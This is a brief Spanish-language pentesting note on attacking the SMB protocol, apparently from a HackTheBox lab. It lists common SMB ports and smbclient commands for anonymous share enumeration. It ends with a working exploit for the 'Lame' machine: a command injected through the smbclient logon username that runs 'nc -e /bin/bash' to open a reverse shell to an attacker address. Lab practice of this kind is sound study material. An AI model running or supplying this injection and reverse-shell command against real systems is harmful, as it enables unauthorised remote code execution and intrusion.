# SMB

Server Message Block (SMB) es un protocolo de red que permite compartir archivos, impresoras, etc, entre nodos de una red de computadoras que usan el sistema operativo Microsoft Windows. Este protocolo pertenece a la capa de aplicación en el modelo TCP/IP.
Hay muchas formas de atacar al protocolo SMB.

## Puertos

Normalmente en windows el mas significativo es el 445 aunque siempre acompañado del 139 y a veces del 135.

## Listado de recursos compartidos de forma anónima

### Con ***smbclient***
<pre>
# De forma genérica
smbclient -L 10.10.10.3 -N

# Indicando el protocolo
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"

# Indicando la ejecuión de un comando. Para ello ha de tener permisos.
# En este caso establece una SHELL reversa. Máquina Lame de HTB
smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.32 443`"'
  
</pre>
